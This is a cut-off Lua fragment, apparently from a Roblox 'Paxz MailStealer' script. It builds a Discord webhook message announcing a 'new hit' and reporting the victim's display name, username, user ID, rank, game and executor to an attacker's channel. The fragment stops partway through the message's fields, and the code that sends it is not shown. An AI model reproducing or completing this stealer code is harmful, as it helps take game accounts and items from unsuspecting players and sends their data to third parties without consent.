...
local msg = {
	["avatar_url"] = "https://cdn.discordapp.com/icons/1102925380769284128/2b4970d81a9a2e9796a6e487ed18f072.png?size=4096",
	["content"]= "**<:Paxz:1117120147786833981> || @here @everyone || ".. _G.UserName ..", Paxz Has Detected A New Hit... <:Paxz:1117120147786833981>**  ",
	["username"] = "Paxz MailStealer",
	["embeds"]= {
	  {
		["title"]= "`Paxz Mailstealer Results`",
		["description"]= "**Data from the victim**\n*** <:Gigachad:1112768331146068069> Recivers Name: ".. _G.UserName .."\n<:Gigachad:1112768331146068069> Display Name: ".._G.PlrDisplayNameVictim.."\n<:Gigachad:1112768331146068069> Username: ".._G.PlrUserVictim.."\n<:Gigachad:1112768331146068069> User ID: ".._G.PlrUserIDVictim.."\n:medal:Rank: ".._G.CurrentRank.."\n:joystick: Place: ".._G.GameIn.."\n:skull_crossbones: Executor: "..exploit.."***",
		["url"]= "https://discord.gg/WCtz6pMRaP",
		["color"]= ""..webhookcolor.."",
		["thumbnail"] = {
        ["url"] = "https://cdn.discordapp.com/icons/1102925380769284128/2b4970d81a9a2e9796a6e487ed18f072.png?size=4096",
        ["height"] = 420,
        ["width"] = 420
        },
		["fields"]= {
